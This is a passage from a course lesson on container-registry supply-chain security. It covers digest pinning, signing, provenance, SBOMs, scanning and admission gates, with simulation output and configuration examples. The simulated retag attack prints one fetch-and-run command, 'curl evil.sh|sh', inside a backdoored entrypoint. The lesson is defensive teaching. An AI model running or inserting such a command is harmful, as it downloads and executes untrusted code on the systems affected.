**Signing.** A signature binds an identity to a digest: "the holder of this key asserts something about `sha256:f0f8e9b…`". Note that it is a statement *about a digest*, which is why signing a tag would be meaningless — you would be signing a pointer. In practice this is **Sigstore**, and its `cosign` tool. Sigstore's headline idea is **keyless signing**: instead of a long-lived private key that someone has to store, rotate and eventually leak, the signer authenticates with an existing identity provider (an OIDC login — OIDC = OpenID Connect, the identity layer on top of OAuth 2.0), receives a **short-lived certificate** binding that identity to an ephemeral key, signs, and throws the key away. The certificate and signature are published to a public append-only **transparency log**, so verification asks "was this signed by `ci@acme.com`, by a workflow in this repository, at a time the certificate was valid?" rather than "do I have the right public key?". There is no key to steal because after about ten minutes there is no key at all. Compare with [Secrets Management & Rotation](../../07-auth-and-security/13-secrets-management-and-rotation/): the best way to protect a secret is for it not to exist.

**Attestations and provenance.** A signature says *who*. An **attestation** is a signed statement about an artifact that says *what and how*. The most important kind is **provenance**: which source repository, which commit, which builder, which build parameters. This is what catches the compromised-build-system case, because the malicious artifact was never produced by the declared builder from the declared commit — and if the attacker also forges the provenance, they have to do it with the builder's identity, which is a much harder problem than pushing to a tag.

**SBOM.** A **Software Bill of Materials** is an inventory of every component inside an artifact: name, version, license, and where it came from. It exists to answer one question fast — *"a serious vulnerability was just published in library X; are we shipping it, and where?"* — without rebuilding anything. Without an SBOM that question takes a day of archaeology per service. With one it is a lookup. The two common formats are SPDX and CycloneDX; either is fine, having one is what matters.

**SLSA.** Pronounced "salsa", **Supply-chain Levels for Software Artifacts** is the framework that names the levels of assurance, so "we secured our pipeline" becomes a claim with a definition. Roughly: the build produces provenance; the provenance is generated by the build platform rather than by the thing being built; the build runs on a hardened, isolated platform whose provenance cannot be forged by a compromised build step. You do not need to memorise the levels. You need the idea that **provenance is only worth as much as the isolation of the thing that generated it** — provenance emitted by a build script the attacker controls proves nothing.

### Scanning, and what a scanner cannot know

A vulnerability scanner reads your SBOM (or reconstructs one by inspecting package databases in the image), looks each component up in a feed of published advisories — the **CVE** system (Common Vulnerabilities and Exposures, the scheme that assigns each publicly known flaw an identifier like `CVE-2024-12345`), plus ecosystem feeds like OSV — and prints what matches. It is genuinely valuable, and it is honest about almost nothing.

**The false-positive problem is structural, not a bug.** A scanner compares versions. It cannot tell whether the vulnerable code path is reachable in your application. An XML parser sitting in your base image that your service never invokes is a finding with the same severity as the TLS library your service uses on every request. In the Build It, `app:1.0` has **5 findings, of which 2 are in packages the image actually loads**; after the upgrade, `app:1.1` has **1 finding, and 0 are reachable.** Both statements are true and only one of them is about risk. (There is a standard for saying so — VEX, Vulnerability Exploitability eXchange, which lets you publish "we ship this component and it is not exploitable in our configuration" as a machine-readable statement rather than a comment in a spreadsheet.)

And the last finding cannot be fixed at all: its `fixed_in` is empty because no upstream patch exists. Which produces the honest version of the rule everyone writes into their pipeline:

> **"Zero criticals" is a policy choice, not a security state.** It is a statement about which severities you count, which packages you exclude, and which advisories your feed happens to carry — not a statement about whether you can be attacked.

That is not an argument against gating. It is an argument for gating on something you can defend: block on *reachable* findings above a severity, require an explicit, expiring, named exception for anything else, and track the age of your oldest unpatched base image as the number that actually correlates with risk.

### The pinning tension, stated honestly

Here is the part most treatments skip.

- **Pin by digest and you get reproducibility.** Every node runs identical bytes. A rollback goes back to a specific artifact. An incident timeline can name exactly what was running. And you are now **frozen on a base image that stops receiving patches the moment you pin it.** Six months later you are shipping a two-hundred-day-old OpenSSL because your pin is doing exactly what you asked.
- **Float on a tag and you get patches.** `python:3.12-slim` is rebuilt with security updates and your next build picks them up for free. And you have destroyed reproducibility: two builds of the same commit produce different images, your CI is not deterministic, and a build that succeeds today may fail tomorrow for reasons that are not in your repository.

Both are correct, and neither is a good place to live. The resolution is not to choose — it is to **make the pin a thing that moves on purpose, under review.** The pattern:

1. Pin everything by digest, in a file that is committed to git.
2. Run an **automated dependency-update bot** on a schedule that watches upstream for new digests and opens a *pull request* proposing the bump, with the changelog and the diff attached.
3. Let CI run against the proposal, exactly as it would for a code change.
4. A human merges it. The pin moves; the audit trail is a commit.

The point is that **the update becomes a reviewable event with a diff**, instead of something that happens silently between two builds. Dependabot and Renovate are the common implementations of this pattern, but name the pattern rather than the tool: *pinned by default, updated by automation, merged by a human.* If the bot is turned off, you have chosen "frozen" and should say so out loud.

## Build It

[`code/registry_and_trust.py`](code/registry_and_trust.py) is a miniature OCI registry plus the trust machinery around it: a content-addressed blob store, tag and index resolution, digest verification, signing, an admission gate and an SBOM diff. Standard library only, deterministic, ~1.7 seconds. Layer content is generated with `hashlib.shake_256`, an extendable-output function, so the same label always yields the same bytes and therefore the same digests on your machine as on mine.

Two things are **modelled rather than real** and it matters that you know which: signatures use HMAC-SHA256 (a shared secret) where real systems use asymmetric signatures and Sigstore's keyless flow, and the advisory feed is a synthetic five-row table rather than the real OSV/NVD databases. Everything else — the sha256 addressing, the deduplication, the tag mutation, the verification failure — is the real mechanism.

**The store is the whole idea in eight lines.** The key is the hash of the value, so `put` of an identical layer is a no-op and `get` can check the server's work:

```python
def put(self, data: bytes) -> str:
    digest = digest_of(data)
    path = self._path(digest)
    self.puts += 1
    if os.path.exists(path):
        self.dedup_hits += 1          # already here: the push uploads nothing
        return digest
    with open(path, "wb") as fh:
        fh.write(data)
    return digest

def get(self, digest: str, verify: bool = True) -> bytes:
    ...
    if verify:                        # the client recomputes; this is the point
        actual = digest_of(data)
        if not hmac.compare_digest(actual, digest):
            raise DigestMismatch(digest, actual)
    return data
```

**Resolution is where tag and digest diverge**, and the two branches are the two trust models:

```python
def resolve(self, ref: str) -> Tuple[str, str]:
    if "@" in ref:
        repo, digest = ref.split("@", 1)
        return repo, digest                    # trust once: the ref IS the content
    repo, tag = ref.rsplit(":", 1)
    ...
    return repo, self.tags[key]                # trust on every pull: ask the server
```

**And the attack is one line**, which is the uncomfortable part. It needs no exploit, no clever trick, and nothing that would look unusual in an access log:

```python
def retag(self, repo: str, tag: str, man_digest: str) -> None:
    """Re-point an existing tag. No special permission, no audit trail, no
    new digest. This one line is the whole attack in section 3."""
    self.tags[(repo, tag)] = man_digest
```

The admission gate is the enforcement point, and it deliberately requires three independent things — a pin, a trusted signature, and acceptable provenance — because each one alone is defeated by an attack the other two catch:

```python
def admit(reg: Registry, ref: str) -> Tuple[bool, List[str]]:
    reasons: List[str] = []
    if "@sha256:" not in ref:
        reasons.append("not pinned by digest")
    ...
    sig = reg.signatures.get(digest)
    if sig is None:
        reasons.append("no signature")
    elif not verify_sig(digest, sig[0], sig[1]):
        reasons.append("signature not from a trusted key (%s)" % sig[0])
    att = reg.attestations.get(digest)
    if att is None:
        reasons.append("no provenance attestation")
    else:
        if att["source_repo"] not in ALLOWED_SOURCES:
            reasons.append("source repo %s not allowed" % att["source_repo"])
        if att["builder"] not in TRUSTED_BUILDERS:
            reasons.append("builder %s not trusted" % att["builder"])
    return (not reasons), reasons
```

Run it:

```bash
docker compose exec -T app python \
  phases/10-infrastructure-and-deployment/04-registries-and-supply-chain/code/registry_and_trust.py
```

```console
== 1 · CONTENT-ADDRESSED STORAGE: TAG -> MANIFEST -> CONFIG + LAYERS ==
  pull registry.internal/app:1.0
    1 · resolve tag     app:1.0                  -> sha256:f29d198cc323
    2 · fetch manifest  sha256:f29d198cc323      -> 1079 bytes, 4 layers
    3 · fetch config    sha256:59cabbdfd302      -> APP_VERSION=1.0
    4 · fetch layers, each verified against its own digest:
         debian-bookworm-slim     sha256:293735e05401   29.3 MiB
         python-3.12.4-runtime    sha256:9f382db21fa8   41.7 MiB
         site-packages@2024-03    sha256:01a40d1a80af   12.1 MiB
         app-code                 sha256:5a1998589b8a    0.4 MiB
       image app:1.0 = 83.5 MiB across 4 layers

  push app:1.1 — 2 of 4 layers are byte-identical to app:1.0
    image app:1.1 logical size            84.0 MiB
    blobs actually uploaded               13.0 MiB   (2 of 4 layers were new)
    the layer blobs now in the store, keyed by sha256(content):
         sha256:293735e05401  debian-bookworm-slim   29.3 MiB   refs 2
         sha256:9f382db21fa8  python-3.12.4-runtime  41.7 MiB   refs 2
         sha256:01a40d1a80af  site-packages@2024-03  12.1 MiB   refs 1
         sha256:5a1998589b8a  app-code                0.4 MiB   refs 1
         sha256:a102a04c2c69  site-packages@2024-07  12.6 MiB   refs 1
         sha256:f0bafd2e78ee  app-code                0.4 MiB   refs 1
    two images, logical bytes            167.4 MiB
    two images, bytes on disk             96.5 MiB
    saved by content addressing           71.0 MiB   (42%)

  ...eight more patch builds pushed (1.2 through 1.9), app-code layer only:
    10 images, logical bytes             839.3 MiB
    10 images, bytes on disk              99.6 MiB
    saved                                739.6 MiB   (88.1%)
    60 blob puts, 26 of them were already present (dedup hits)
  a registry is a key-value store keyed by the hash of the value.
  that is why 10 releases cost 99.6 MiB instead of 839.3 MiB.

== 2 · ONE TAG, TWO ARCHITECTURES, TWO DIFFERENT SETS OF BYTES ==
  tag app:1.1 now points at an image INDEX, not an image:
    app:1.1  ->  sha256:f0f8e9b7712b   (index, 2 platforms)
      linux/amd64  -> sha256:021ff5d9dff0
      linux/arm64  -> sha256:6903a610c98a
    same tag, same pull command, different manifests: True
    layers shared across the two architectures: site-packages@2024-07, app-code
    the arm64 variant added 73.0 MiB to the store: only the base OS and the
    interpreter are arch-specific; wheels and app code are not.
  this is why `latest` on your laptop and `latest` on the cluster can be
  different bytes with nothing wrong: an index resolves per platform.
  the digest you pin must therefore be the INDEX digest, not one platform's.

== 3 · THE MUTABLE TAG: SAME REFERENCE, DIFFERENT BYTES ==
  Tue 09:14  deploy  registry.internal/app:1.0
             manifest  sha256:f29d198cc323
             app-code  sha256:5a1998589b8a
             entrypoint reads: '# app 1.0  build 8f21c4  (clean)'
  Wed 23:47  a build-system credential leaks; someone pushes to the SAME tag
  Thu 02:03  a node reboots and re-pulls registry.internal/app:1.0
             manifest  sha256:2e3da6b042ac
             app-code  sha256:5168730c3eac
             entrypoint reads: "# app 1.0  build 8f21c4  + os.system('curl evil.sh|sh')"

  the reference string you typed:  registry.internal/app:1.0   (unchanged)
  the bytes you received:
    Tue 09:14   sha256:f29d198cc323dcabd3b27b2f2d34b9db7a417166b5b0c347c5a9b9d1b8c04fda
    Thu 02:03   sha256:2e3da6b042acdca018bd388aeda470ea349d2dcd14b79cb6844dfd8007f3c97d
    identical?  False
  three nodes pulling `app:1.0` on three different days now run three
  different builds, and every one of them reports version 1.0.

  the same two pulls, pinned by digest:
    registry.internal/app@sha256:f29d198cc323dcabd3b27b2f2d34b9db7a417166b5b0c347c5a9b9d1b8c04fda
    Tue 09:14   sha256:f29d198cc323dcabd3b27b2f2d34b9db7a417166b5b0c347c5a9b9d1b8c04fda
    Thu 02:03   sha256:f29d198cc323dcabd3b27b2f2d34b9db7a417166b5b0c347c5a9b9d1b8c04fda
    identical?  True
    entrypoint reads: '# app 1.0  build 8f21c4  (clean)'
  the retag did not touch the pinned pull, because the pin does not ask
  the registry WHICH manifest — it asks for THAT one, by content.
  a lifecycle policy then garbage-collects that manifest. The same pin:
    MANIFEST_UNKNOWN, and the deploy fails
  a pin either returns the exact bytes or nothing. It never silently
  resolves to something else — the pinned path fails closed by design.

== 4 · DIGEST VERIFICATION: ONE FLIPPED BIT, DETECTED ON PULL ==
  the app-code blob of app:1.1 is sha256:f0bafd2e78ee (421888 bytes).
  a bit flips at byte 169781 — bad disk, a bad mirror, or a hostile one.
    byte 169781 was 0x3e, is now 0x3f  (1 of 421888 bytes differ)

  pull WITHOUT verification:
    returned 421888 bytes, no error raised. This layer would now execute.
  pull WITH verification (recompute sha256 over what arrived):
    expected  sha256:f0bafd2e78ee953d924b534da060eaa811b55422a8bfcf8fe949587f16da0d81
    actual    sha256:039a05eedf3908936628a5929eeb0a08a5319219989086bc99623a4b29b78b99
    REJECTED. 1 bit in 421888 bytes changed 58 of 64 hex digits.
  content addressing is not a caching trick with a security side effect.
  it is an integrity check that happens to make caching free.

== 5 · SIGNING, PROVENANCE AND AN ADMISSION GATE ==
  the pipeline signs the digest it just produced, not the tag:
    subject   sha256:f0f8e9b7712b7c0561a5b126130c4fa54226425ab5672695c821a5119d0df182
    key id    release-2026-q1
    signature 8b2bfeb74d6a4549164e022b27a6ca471552190710fbb9da3be66803373cc10e
    verify    True

  a signature is a statement ABOUT A DIGEST. Move it to another digest:
    same signature, subject sha256:2e3da6b042ac
    verify    False   <- the digest is part of what was signed
  signed with a key that was rotated out of the trust policy:
    verify    False   <- valid HMAC, untrusted key. Both checks matter.

  the deploy gate, run at admission time on every image in the manifest:
    require: pinned by digest AND signature from a trusted key AND
             provenance naming an allowed source repo and a trusted builder

    DENY  registry.internal/app:latest                    not pinned by digest; no signature; no provenance attestation
    DENY  registry.internal/app:1.1                       not pinned by digest
    ALLOW registry.internal/app@sha256:f0f8e9b7712b7c...
    DENY  registry.internal/app@sha256:2e3da6b042acdc...  no signature; no provenance attestation
    DENY  registry.internal/app@sha256:021ff5d9dff0e3...  signature not from a trusted key (release-2025-q4)
    DENY  registry.internal/scraper@sha256:411713da89...  source repo github.com/dev-personal/app-fork not allowed; builder laptop/docker not trusted

  1 of 6 candidates admitted.
  note candidate 2: app:1.1 IS the good image and IS signed — denied only
  because it was requested by tag. The gate cannot verify a pointer.

== 6 · SBOM: WHAT CHANGED BETWEEN TWO BUILDS, AND WHAT A SCANNER SEES ==
  app:1.0  14 components      app:1.1  18 components
  diff: 5 added, 1 removed, 8 upgraded, 5 unchanged
    ~ certifi              2024.2.2   -> 2024.7.4
    ~ idna                 3.6        -> 3.7
    ~ libexpat1            2.5.0      -> 2.6.2
    ~ openssl              3.0.13     -> 3.0.14
    ~ pydantic             2.6.4      -> 2.7.1
    ~ pydantic-core        2.16.3     -> 2.18.2
    ~ requests             2.31.0     -> 2.32.3
    ~ urllib3              2.0.7      -> 2.2.3
    + anyio                4.3.0
    + h11                  0.14.0
    + httpcore             1.0.5
    + httpx                0.27.0
    + sniffio              1.3.1
    - python-dateutil      2.8.2
  the diff is the release note nobody writes: 'we also upgraded openssl
  and pulled in 5 new transitive packages'.

  scanned against a SYNTHETIC 5-row advisory feed (a real one is OSV/NVD):
    app:1.0  5 findings, 2 in a package this image actually loads
       ADV-2026-0101  openssl          3.0.13    HIGH    REACHABLE
       ADV-2026-0107  urllib3          2.0.7     HIGH    REACHABLE
       ADV-2026-0112  libexpat1        2.5.0     MEDIUM  present, never loaded
       ADV-2026-0119  perl-base        5.36.0    MEDIUM  present, never loaded
       ADV-2026-0124  python-dateutil  2.8.2     LOW     present, never loaded
    app:1.1  1 finding, 0 in a package this image actually loads
       ADV-2026-0119  perl-base        5.36.0    MEDIUM  present, never loaded
  every remaining app:1.1 finding is in a package the app never imports.
  a scanner cannot tell: it reads the SBOM, not the call graph. And the
  one that is left has fixed_in = none — no upstream fix exists, so
  'zero criticals' is reachable only by choosing what to count.

  (total wall time 1.7 s, 43 blobs, 173.2 MiB on disk)
```

**Section 1 is the mechanism, and the numbers are the argument for it.** A pull is a resolution followed by three verified fetches. Then the second image lands: `app:1.1` is **84.0 MiB logically but uploaded 13.0 MiB**, because two of its four layers are byte-identical to layers already present and the store's key for them is already occupied. Across the two images that is **167.4 MiB of logical content in 96.5 MiB on disk — 71.0 MiB saved, 42%** — and across ten releases of the same service it is **839.3 MiB in 99.6 MiB, an 88.1% saving from 26 dedup hits across 60 blob puts.** Nothing compressed anything. The saving is a side effect of naming things by their hash.

**Section 2** is the legitimate ambiguity. One tag, `app:1.1`, resolves through an index to `sha256:021ff5d9dff0` on amd64 and `sha256:6903a610c98a` on arm64. Both are correct. Two of the four layers are shared across architectures — the pure-Python wheels and the application code, which contain no machine code — so the second architecture cost **73.0 MiB rather than another 84.0 MiB.** The practical instruction is in the last line: pin the **index** digest (`sha256:f0f8e9b7712b`), because pinning a platform manifest silently pins your architecture too.

**Section 3 is the lesson.** Two pulls of `registry.internal/app:1.0`, with the reference string byte-for-byte identical, return `sha256:f29d198c…` and `sha256:2e3da6b0…`. The entrypoint the first pull got says `build 8f21c4 (clean)`; the entrypoint the second pull got says `build 8f21c4 + os.system('curl evil.sh|sh')`. It still claims to be build `8f21c4`, because the attacker wrote that string, and there is no mechanism anywhere in the pull path that could contradict it. Meanwhile the same two pulls issued against `app@sha256:f29d198c…` return **identical? True** both times, and the clean entrypoint. The pinned reference was not defended by policy or by luck; it simply never asked a question whose answer someone else controls. And when the pinned manifest is later garbage-collected, the pin returns **`MANIFEST_UNKNOWN` and the deploy fails** — the pinned path fails closed, which is what makes it safe to rely on.

**Section 4 is why content addressing is a security property.** One bit flips in a 421,888-byte layer — byte 169,781 goes from `0x3e` to `0x3f`. Read the blob without verification and you get 421,888 bytes and no error; that layer would be unpacked and executed. Recompute the hash and the expected `sha256:f0bafd2e78ee…` becomes `sha256:039a05eedf39…`: **58 of the 64 hex digits changed from a single flipped bit.** That is the avalanche property of a cryptographic hash doing exactly its job, and it means detection does not depend on the corruption being large, deliberate, or in an interesting place.

**Section 5 separates two things that get bundled together as "signing".** The signature verifies against the digest it was made for and fails the moment you move it to another one — a **signature transplant onto the backdoored manifest returns False**, because the digest is part of what was signed. Separately, a *cryptographically valid* HMAC made with the rotated `release-2025-q4` key also returns **False**, because trust is a policy question, not a maths question. Then the gate: of six candidate deployments, **1 of 6 is admitted.** Read candidate 2 twice — `app:1.1` is the correct, signed, well-provenanced image, and it is **denied purely because it was requested by tag.** That is not the policy being pedantic. A gate that admits a tag has verified a pointer, and the pointer can be moved after the check.

**Section 6** turns "what changed?" into a lookup. Between two builds: **5 components added, 1 removed, 8 upgraded, 5 unchanged** — including an `openssl` bump that appeared in no release note and five new transitive packages that arrived with `httpx`. Scanned, `app:1.0` shows **5 findings of which 2 are reachable**; `app:1.1` shows **1 finding, 0 reachable**, and that last one has no upstream fix at all. A team with a "no MEDIUM or above" gate is now blocked forever on something they cannot patch and that no attacker can reach — which is the false-positive problem turning into a process problem, on schedule.

## Use It

### Sign in the pipeline, verify at admission

`cosign` is the standard tool. Keyless signing needs no key material at all — it uses the OIDC token your CI provider already gives the workflow:

```bash
# In CI, after the push. Sign the DIGEST the build produced, never the tag.
DIGEST=$(crane digest registry.internal/app:1.1)      # or: docker buildx --metadata-file
cosign sign --yes "registry.internal/app@${DIGEST}"

# Attach the SBOM and the provenance as attestations of the same subject.
syft "registry.internal/app@${DIGEST}" -o spdx-json > sbom.spdx.json
cosign attest --yes --type spdxjson --predicate sbom.spdx.json \
  "registry.internal/app@${DIGEST}"

# Verify — anywhere, by anyone. The identity, not a public key, is the check.
cosign verify \
  --certificate-identity-regexp '^https://github\.com/acme/app/\.github/workflows/.+' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  "registry.internal/app@${DIGEST}"
```

The two `--certificate-*` flags are the whole trust decision, and they are worth reading closely: *this artifact was signed by a workflow in this repository, authenticated by this identity provider.* Verifying without pinning the identity is verifying that **somebody** signed it, which is not a check — anyone can sign anything.

### Deploy by digest

```yaml
spec:
  containers:
    - name: api
      # Not app:1.1. Keep the tag in a comment for humans; deploy the digest.
      image: registry.internal/app@sha256:f0f8e9b7712b7c0561a5b126130c4fa54226425ab5672695c821a5119d0df182
      imagePullPolicy: IfNotPresent
```

`imagePullPolicy` semantics are worth getting right because the defaults surprise people:

| Value | Behaviour | Use when |
|---|---|---|
| `Always` | contact the registry on every pod start, even if the image is cached | you deploy mutable tags — a workaround for a problem you should not have |
| `IfNotPresent` | use the local copy if the digest is already on the node | **you deploy by digest** — the local copy is provably the right bytes |
| `Never` | fail if not already present | air-gapped nodes with pre-loaded images |

The default is `IfNotPresent`, **except** that a container whose tag is `:latest` defaults to `Always`. That exception exists precisely because `latest` is mutable, and it tells you what Kubernetes thinks of the practice. When you deploy by digest, `IfNotPresent` is not merely safe but *strictly correct*: a cached blob whose sha256 matches the requested digest is the requested content, by definition. You also stop paying a registry round-trip on every pod start, which matters at 03:00 when you are restarting a hundred pods and the registry is the thing that is down.

### The registry is production infrastructure

If the registry is unreachable, nodes cannot start pods. Not "deploys are blocked" — **you cannot recover from an unrelated outage**, because every scale-up and every reschedule needs a pull. Give it the availability requirements of a database, not of a wiki.

Two specific failure modes to pre-empt:

- **Pull rate limits.** Docker Hub enforces per-IP anonymous pull limits, and a NAT gateway makes your whole cluster one IP. The failure looks like `TOOMANYREQUESTS` at exactly the moment you are scaling up under load. The fix is a **pull-through cache** — a registry running in your own network configured as a mirror, which fetches upstream once and serves your fleet from local disk. It cuts egress cost and removes an external dependency from your recovery path. Every major registry product supports this mode.
- **Lifecycle policies, deliberately configured.** ECR, GAR and ACR (the AWS, Google and Azure registries) all charge per GB-month and all keep everything forever by default. Ten builds a day for three years is a five-figure line item for artifacts nobody will ever pull. But a policy that deletes by age deletes the image your pinned rollback target needs. Write the rule with that in mind: keep the last N tagged releases indefinitely, keep anything currently referenced by a running workload, expire *untagged* images after 14–30 days, and — before you enable it — confirm your rollback window is shorter than your retention window.

```json
{ "rules": [
  { "rulePriority": 1, "description": "keep the last 30 release images",
    "selection": { "tagStatus": "tagged", "tagPrefixList": ["v"],
                   "countType": "imageCountMoreThan", "countNumber": 30 },
    "action": { "type": "expire" } },
  { "rulePriority": 2, "description": "expire untagged after 21 days",
    "selection": { "tagStatus": "untagged",
                   "countType": "sinceImagePushed", "countUnit": "days", "countNumber": 21 },
    "action": { "type": "expire" } }
] }
```

Also turn on **tag immutability** if your registry offers it (ECR and ACR both do). It makes a re-push to an existing tag an error instead of a silent overwrite — the single highest-value setting in this lesson, and it is a checkbox.

### Enforce it at admission

The gate from section 5, as a real policy. Kyverno and Gatekeeper are the two common admission controllers; this is Kyverno, and it does both checks in one rule:

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-signed-and-pinned-images
spec:
  validationFailureAction: Enforce      # Audit first, Enforce once it is clean
  rules:
    - name: verify-signature
      match:
        any: [{ resources: { kinds: [Pod] } }]
      verifyImages:
        - imageReferences: ["registry.internal/*"]
          mutateDigest: true            # rewrite tag -> digest at admission time
          required: true
          attestors:
            - entries:
                - keyless:
                    issuer: https://token.actions.githubusercontent.com
                    subject: "https://github.com/acme/app/.github/workflows/*"
```

`mutateDigest: true` deserves a note: it resolves the tag to a digest **at admission time and rewrites the pod spec**, so the running object records the exact artifact even if a human deployed a tag. That is a genuinely useful safety net — the resolution happens once, under policy, instead of independently on every node at every restart. It is not a substitute for pinning in git, because it cannot tell you *which* bytes you intended.

Roll it out in `Audit` mode first and read the report. In any real cluster the first run denies things you did not know you were running.

### Tooling, briefly

- **`syft`** generates an SBOM from an image; **`grype`** and **`trivy`** scan one. `trivy` also scans filesystems and IaC. Run the scan in CI on the digest you just built, and again on a schedule against what is deployed — a new advisory can make yesterday's clean image vulnerable without anything about it changing.
- **`crane`** and **`skopeo`** manipulate images and registries directly (`crane digest`, `crane copy`, `skopeo inspect`) without a Docker daemon. `crane digest <ref>` is the command that turns a tag into a pin.
- **Dependabot / Renovate** implement the pinning-tension pattern. Renovate in particular understands digest pinning in Dockerfiles and Kubernetes manifests, and will open a PR that bumps `FROM python:3.12-slim@sha256:…` to the new digest with the changelog attached.

### Production rules

- **Deploy by digest, always. Tags are for humans.** Your Deployment, your Helm values and your Terraform should contain `@sha256:…`. Keep the tag next to it in a comment so a person can read it.
- **Sign in the pipeline; verify at admission.** Signing without verification is theatre. The verify step must pin the *identity* — `--certificate-identity-regexp` — or it proves only that somebody, somewhere, signed something.
- **Enable tag immutability** on every repository that has it, so a re-push to an existing tag is an error rather than a silent overwrite.
- **Keep an SBOM per release, stored as an attestation on the digest.** The question it answers — "are we shipping this library, and where?" — always arrives on a day when you have no time to answer it any other way.
- **Treat the registry as production infrastructure.** Multi-AZ, monitored, with a pull-through cache so an upstream outage or a rate limit cannot stop you scaling up. Write the lifecycle policy so that the images inside your rollback window are exempt from expiry, and verify that before enabling it.
- **Pin by default, update by bot, merge by human.** A digest pin with no bot behind it is a decision to run unpatched software; if you have made that decision, make it explicitly and put a date on it.
- **Gate on reachable findings, not on the count.** "Zero criticals" is a counting policy. Block on exploitable, reachable, fixable findings; require a named, expiring exception for everything else; and track the age of your oldest base image as the number that actually moves risk.

## Think about it

1. Your Deployment pins `app@sha256:f0f8e9b…` and your registry's lifecycle policy expires untagged images after 14 days. Six weeks after a release you need to roll back to it. Walk through exactly what happens, and write the lifecycle rule that would have prevented it without keeping every artifact forever.
2. Section 4 flipped one bit in a 421,888-byte layer and 58 of the 64 hex digits of the digest changed. Explain why an attacker cannot use that as a starting point to craft a *different* malicious layer with the *same* digest — and what would have to become true about SHA-256 for pinning by digest to stop being a defence.
3. Your admission controller verifies signatures but your deployment pipeline still writes tags into the pod spec, relying on `mutateDigest: true` to resolve them. Describe the window this leaves open, who has to be compromised to exploit it, and what it costs you during an incident even if nobody is attacking you.
4. `app:1.1` was denied by the gate in section 5 despite being the correct, signed image, purely because it was referenced by tag. Argue the case for relaxing that rule to "signed, tag allowed" — then say precisely which of the three attacks in The Problem that relaxation lets back in.
5. You pin every base image by digest. Nine months later a critical vulnerability is published in your base OS's TLS library. Your fleet is 40 services owned by 12 teams, each with its own pinned digest in its own repository. Describe the sequence of steps to get every service onto a patched base, and identify which single artifact from this lesson makes step one take minutes instead of a week.

## Key takeaways

- **A tag is a mutable pointer; a digest is the content.** Two pulls of the identical reference `registry.internal/app:1.0` returned `sha256:f29d198c…` and `sha256:2e3da6b0…` — different manifests, different entrypoints, both reporting version 1.0. The same two pulls of `app@sha256:f29d198c…` returned **identical? True**. Pulling by tag is trust-on-every-pull; pulling by digest is trust-once, and its failure mode is `MANIFEST_UNKNOWN` rather than the wrong content.
- **Content addressing is one mechanism that buys storage, caching and integrity.** Ten releases of one service held **839.3 MiB of logical images in 99.6 MiB — an 88.1% saving from 26 dedup hits across 60 blob puts** — and pushing an 84.0 MiB image uploaded 13.0 MiB. The same property caught a single flipped bit in a 421,888-byte layer: **58 of 64 hex digits changed**, rejected on pull.
- **One tag can legitimately mean different bytes.** An image index resolved `app:1.1` to `sha256:021ff5d9dff0` on amd64 and `sha256:6903a610c98a` on arm64. Pin the **index** digest (`sha256:f0f8e9b7712b`), or you have quietly pinned your architecture as well.
- **Pinning and signing solve different problems and you need both.** A pin proves nobody changed the artifact since you looked; a signature proves who made it. Transplanting a valid signature onto the backdoored manifest verified **False**, and a cryptographically valid signature from a rotated key also verified **False** — trust is policy, not arithmetic. At the gate, **1 of 6 candidates was admitted**, and the correct signed image was denied purely for being referenced by tag.
- **"Zero criticals" is a counting policy, not a security state.** `app:1.0` had **5 findings, 2 reachable**; `app:1.1` had **1 finding, 0 reachable**, and that one has no upstream fix. A scanner reads your SBOM, not your call graph, so gate on reachable and fixable findings and track the age of your oldest base image instead.
- **The pinning tension has a process answer, not a technical one.** Digest pins freeze you on unpatched bases; floating tags destroy reproducibility. The resolution is **pinned by default, updated by automation, merged by a human** — the bump becomes a reviewable commit with a diff, and an SBOM per release turns "are we affected?" from a week of archaeology into a lookup.

Next: [Config, Environments & the Twelve-Factor App](../05-config-and-twelve-factor/) — you can now name the exact bytes that run everywhere; the next question is how one artifact behaves differently in staging and production without being rebuilt.
